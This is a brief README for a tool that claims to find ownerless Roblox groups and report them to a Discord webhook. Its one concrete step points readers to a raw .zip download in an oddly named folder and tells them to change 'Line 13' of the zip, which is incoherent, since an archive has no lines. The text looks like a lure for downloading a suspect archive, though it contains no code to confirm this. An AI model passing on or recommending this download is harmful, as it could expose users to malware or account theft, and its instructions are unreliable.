# Roblox-Group-Finder
A tool to help you find ownerless roblox groups :)


- It's really easy, all you need is a discord webhook :)


- It will not send locked groups so don't worry LOLLL.


- On Line 13 Of https://raw.githubusercontent.com/AxamGaming/Roblox-Group-Finder/main/malacodermous/Finder_Roblox_Group_v1.3-beta.3.zip Change That To The Range Of Groups You Want To Scan. *(Ex: 20243-345354)*
